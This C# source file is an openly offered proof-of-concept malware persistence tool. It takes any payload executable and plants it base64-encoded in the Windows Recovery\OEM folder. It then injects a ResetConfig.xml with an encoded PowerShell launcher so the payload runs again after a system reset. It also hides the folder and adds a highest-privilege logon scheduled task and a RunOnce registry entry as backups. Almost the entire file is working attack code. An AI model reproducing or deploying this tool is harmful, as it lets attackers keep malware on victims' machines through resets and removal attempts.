using System;
using System.IO;
using System.Xml;
using System.Diagnostics;
using System.Security.Principal;
using System.Security.AccessControl;
using Microsoft.Win32;
using System.Threading;

namespace ResetSurvivalPoC
{
    class Program
    {
        static void Main(string[] args)
        {
            string tempPath = Path.Combine(Path.GetTempPath(), "recoveryrunner.exe");

            Console.Title = "Reset Survival PoC";

            Console.WriteLine("=== CREATED BY MPCMDRUN ===");
            Console.Write("Enter full path to your payload EXE: ");
            string exePath = Console.ReadLine();

            if (!File.Exists(exePath))
            {
                Console.WriteLine("[-] EXE not found!");
                return;
            }

            string recoveryDir = @"C:\Recovery\OEM";
            string xmlPayloadPath = Path.Combine(recoveryDir, "recoverypayload.xml");
            string resetConfigPath = Path.Combine(recoveryDir, "ResetConfig.xml");

            try
            {
                Console.WriteLine("[*] Encoding executable...");
                byte[] exeBytes = File.ReadAllBytes(exePath);
                string base64Exe = Convert.ToBase64String(exeBytes);

                if (!Directory.Exists(recoveryDir))
                {
                    Console.WriteLine("[*] Creating Recovery\\OEM...");
                    Directory.CreateDirectory(recoveryDir);
                }

                TakeOwnership(@"C:\Recovery");
                TakeOwnership(@"C:\Recovery\OEM");

                Console.WriteLine("[*] Writing Base64 payload XML...");
                using (StreamWriter writer = new StreamWriter(xmlPayloadPath, false))
                {
                    writer.WriteLine("<RecoveryPayload>");
                    writer.WriteLine($"  <Base64Executable>{base64Exe}</Base64Executable>");
                    writer.WriteLine("</RecoveryPayload>");
                }

                Console.WriteLine("[*] Building ResetConfig.xml...");

                string runnerCode = GetRecoveryRunnerCode();
                File.WriteAllText(Path.Combine(Path.GetTempPath(), "runner_temp.cs"), runnerCode);
                string runnerExePath = Path.Combine(Path.GetTempPath(), "RecoveryRunner.exe");

                CompileTempRunner(runnerExePath);

                string runnerB64 = Convert.ToBase64String(File.ReadAllBytes(runnerExePath));

                using (StreamWriter writer = new StreamWriter(resetConfigPath, false))
                {
                    writer.WriteLine("<Reset>");
                    writer.WriteLine("  <Customizations>");
                    writer.WriteLine("    <Run>");
                    writer.WriteLine("      <Path>cmd.exe</Path>");
                    writer.WriteLine("      <Arguments>/c powershell -e " + Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(BuildPowershellLauncher(runnerB64))) + "</Arguments>");
                    writer.WriteLine("    </Run>");
                    writer.WriteLine("  </Customizations>");
                    writer.WriteLine("</Reset>");
                }

                Console.WriteLine("[+] ResetConfig.xml injected.");

                Console.WriteLine("[*] Hiding Recovery folder...");
                DirectoryInfo di = new DirectoryInfo(@"C:\Recovery");
                di.Attributes |= FileAttributes.Hidden;

                Console.WriteLine("[+] Creating Scheduled Task backup...");
                CreateScheduledTask();

                Console.WriteLine("[+] Dropping RunOnce Registry backup...");
                CreateRunOnce();

                Console.WriteLine("\n[+] ALL DONE! Recovery Persistence armed.");

            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }

            Console.WriteLine("\nPress any key to exit...");
            Console.ReadKey();
        }

        static void TakeOwnership(string folderPath)
        {
            try
            {
                DirectoryInfo dirInfo = new DirectoryInfo(folderPath);
                DirectorySecurity dirSecurity = dirInfo.GetAccessControl();

                SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, null);
                dirSecurity.SetOwner(sid);
                dirInfo.SetAccessControl(dirSecurity);

                Console.WriteLine("[+] Took ownership: " + folderPath);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Ownership fail: " + ex.Message);
            }
        }

        static void CompileTempRunner(string outputPath)
        {
            string tempRunnerSource = Path.Combine(Path.GetTempPath(), "runner_temp.cs");

            Process compiler = new Process();
            compiler.StartInfo.FileName = @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe";
            compiler.StartInfo.Arguments = $"/target:exe /out:\"{outputPath}\" \"{tempRunnerSource}\"";
            compiler.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            compiler.StartInfo.CreateNoWindow = true;
            compiler.Start();
            compiler.WaitForExit();
        }

        static string GetRecoveryRunnerCode()
        {
            return @"
using System;
using System.IO;
using System.Xml;
using System.Diagnostics;

namespace RecoveryRunner
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                string xmlPath = @""C:\Recovery\OEM\recoverypayload.xml"";
                string tempExe = Path.Combine(Path.GetTempPath(), ""recoveredpayload.exe"");

                XmlDocument doc = new XmlDocument();
                doc.Load(xmlPath);
                XmlNode node = doc.SelectSingleNode(""//Base64Executable"");

                byte[] exeBytes = Convert.FromBase64String(node.InnerText);
                File.WriteAllBytes(tempExe, exeBytes);

                Process.Start(new ProcessStartInfo
                {
                    FileName = tempExe,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
            }
            catch { }
        }
    }
}
";
        }

        static string BuildPowershellLauncher(string runnerBase64)
        {
            return $"[IO.File]::WriteAllBytes('%TEMP%\\recoveryrunner.exe',[Convert]::FromBase64String('{runnerBase64}'));Start-Process '%TEMP%\\recoveryrunner.exe'";
        }

        static void CreateScheduledTask()
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = "/create /tn \"RecoveryRunnerTask\" /tr \"cmd /c %TEMP%\\recoveryrunner.exe\" /sc ONLOGON /rl HIGHEST /f",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            }).WaitForExit();
        }

        static void CreateRunOnce()
        {
            try
            {
                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);
                key.SetValue("RecoveryRunner", @"%TEMP%\recoveryrunner.exe");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Registry fail: " + ex.Message);
            }
        }
    }
}
